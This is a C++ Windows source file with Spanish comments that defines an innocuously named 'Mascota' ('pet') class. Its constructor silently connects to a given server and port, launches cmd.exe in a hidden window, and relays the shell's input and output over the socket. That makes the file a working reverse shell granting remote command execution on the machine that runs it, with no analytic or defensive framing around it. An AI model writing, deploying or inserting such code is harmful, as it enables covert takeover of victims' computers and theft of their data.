#include "mascota.h"
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

// Constructor de la clase Mascota
Mascota::Mascota(const char* nombre, const char* servidor, int puerto) {
    this->nombre = nombre;
    this->servidor = servidor;
    this->puerto = puerto;
    std::cout << "ojito lo que hicimos\n";
    conectarServidor();
}

// Lee del proceso y lo envía por el socket
void pipeToSocket(HANDLE hRead, SOCKET sock) {
    char buffer[1024];
    DWORD bytesRead;
    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        send(sock, buffer, bytesRead, 0);
    }
}

// Lee del socket y lo escribe en el proceso
void socketToPipe(SOCKET sock, HANDLE hWrite) {
    char buffer[1024];
    int bytesRecv;
    while ((bytesRecv = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        DWORD bytesWritten;
        WriteFile(hWrite, buffer, bytesRecv, &bytesWritten, NULL);
    }
}

// Función que maneja la conexión al servidor
void Mascota::conectarServidor() {
    WSADATA wsaData;
    SOCKET sock;
    struct addrinfo hints = {}, * res;
    char portStr[6];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    _snprintf_s(portStr, sizeof(portStr), _TRUNCATE, "%d", puerto);

    if (getaddrinfo(servidor, portStr, &hints, &res) != 0) {
        WSACleanup();
        return;
    }

    sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
        closesocket(sock);
        freeaddrinfo(res);
        WSACleanup();
        return;
    }

    freeaddrinfo(res);

    // Crear pipes
    HANDLE hStdInRead, hStdInWrite;
    HANDLE hStdOutRead, hStdOutWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = si.hStdError = hStdOutWrite;

    char cmdLine[] = "cmd.exe";

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(hStdInRead);
        CloseHandle(hStdOutWrite);

        std::thread t1(pipeToSocket, hStdOutRead, sock);
        std::thread t2(socketToPipe, sock, hStdInWrite);

        WaitForSingleObject(pi.hProcess, INFINITE);

        t1.join();
        t2.join();

        CloseHandle(pi.hProcess);
    }

    closesocket(sock);
    WSACleanup();
}
